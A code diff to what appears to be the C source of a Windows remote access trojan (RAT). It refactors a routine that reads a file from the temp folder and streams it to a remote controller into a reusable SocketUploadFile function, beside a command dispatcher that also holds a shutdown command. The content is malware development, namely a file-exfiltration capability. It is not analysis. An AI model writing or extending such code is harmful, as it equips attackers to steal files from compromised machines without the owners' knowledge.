@@ -42,6 +42,36 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSiz
 	return 0;
 }
 
+int SocketUploadFile(RATSocket* ratSocket, char* filePath)
+{
+	FILE* fs;
+	errno_t errorNo = fopen_s(&fs, filePath, "rb");
+	if ( errorNo == 0 )
+	{
+		while( !feof(fs) )
+		{
+			char readBuffer[SOCKET_BUFFER_SIZE] = {};
+			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
+			if ( readSize > 0 )
+			{
+				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
+				OutputDebugStringA(readBuffer);
+				OutputDebugStringA("\n");
+			}
+		}
+		SocketSend(ratSocket, "DONE", 4);
+		OutputDebugString("DONE");
+		fclose(fs);
+		return 0;
+	}
+	else
+	{
+		OutputDebugString("[ERROR] Error opening file.\n");
+		fclose(fs);
+		return 1;
+	}
+}
+
 int SplitString(char* str, char* dest[SPLIT_STRING_ARRAY_SIZE], char* seps)
 {
 	int index = 0;
@@ -268,31 +298,7 @@ WinMain(HINSTANCE hInstance,
 			strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
 			strncat_s(filePath, "test.txt", 8);
 
-			FILE* fs;
-			errno_t errorNo = fopen_s(&fs, filePath, "rb");
-			if ( errorNo == 0 )
-			{
-				while( !feof(fs) )
-				{
-					char readBuffer[SOCKET_BUFFER_SIZE] = {};
-					size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
-					if ( readSize > 0 )
-					{
-						SocketSend(&ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
-						OutputDebugStringA(readBuffer);
-						OutputDebugStringA("\n");
-					}
-				}
-				SocketSend(&ratSocket, "DONE", 4);
-				OutputDebugString("DONE");
-			}
-			else
-			{
-				OutputDebugString("[ERROR] Error opening file.\n");
-			}
-			fclose(fs);
-	
-			return 0;
+			SocketUploadFile(&ratSocket, filePath);
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
